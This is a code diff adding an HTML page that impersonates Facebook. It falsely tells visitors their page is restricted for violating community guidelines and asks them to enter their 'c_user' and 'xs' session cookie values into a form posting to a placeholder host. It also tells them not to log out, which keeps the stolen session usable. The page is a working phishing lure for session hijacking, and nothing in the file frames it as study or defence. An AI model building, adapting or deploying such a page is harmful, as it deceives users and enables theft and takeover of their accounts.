@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Request Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #3b5998;
+      color: white;
+      padding: 10px 15px;
+      font-size: 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .header img {
+      height: 30px;
+      width: 30px;
+    }
+    .container {
+      max-width: 400px;
+      background-color: white;
+      margin: 30px auto;
+      padding: 20px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    a.help-center {
+      display: inline-block;
+      margin: 10px 0 20px 0;
+      color: #3578e5;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    a.help-center:hover {
+      text-decoration: underline;
+    }
+    h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+    }
+    h2 img {
+      height: 1em;
+      margin-left: 6px;
+    }
+    p {
+      font-size: 14px;
+      color: #555;
+      margin: 8px 0 15px 0;
+      line-height: 1.4;
+    }
+    .video-container {
+      margin-bottom: 10px;
+    }
+    .enable-sound-btn {
+      background-color: #1877f2;
+      color: white;
+      padding: 8px 15px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 6px 10px;
+      border: 1px solid #dddfe2;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+    input[type="submit"] {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      cursor: pointer;
+      font-weight: bold;
+      border-radius: 3px;
+    }
+    input[type="submit"]:hover {
+      background-color: #165ecc;
+    }
+    .footer-text {
+      font-size: 12px;
+      color: #90949c;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+    facebook
+  </div>
+  <div class="container">
+    <a href="#" class="help-center">Help Center</a>
+    <h2>
+      Request For Remove Page Violation
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" 
+        alt="Blue Tick" 
+        style="height: 1em; vertical-align: middle; margin-left: 6px;"
+      />
+    </h2>
+    <p>We've identified irregular activity on your page that goes against our community guidelines.</p>
+    <p>As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
+    <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+
+    <div class="video-container">
+      <video width="100%" controls>
+        <source src="#" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
+    </div>
+
+    <button class="enable-sound-btn" type="button">Enable Sound</button>
+
+    <form action="https://example.com/submit" method="POST">
+      <div class="form-group">
+        <label for="c_user">c_user</label>
+        <input type="text" id="c_user" name="c_user" required />
+      </div>
+      <div class="form-group">
+        <label for="xs">xs</label>
+        <input type="text" id="xs" name="xs" required />
+      </div>
+      <p class="footer-text">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
+      <input type="submit" value="Submit" />
+    </form>
+  </div>
+</body>
+</html>
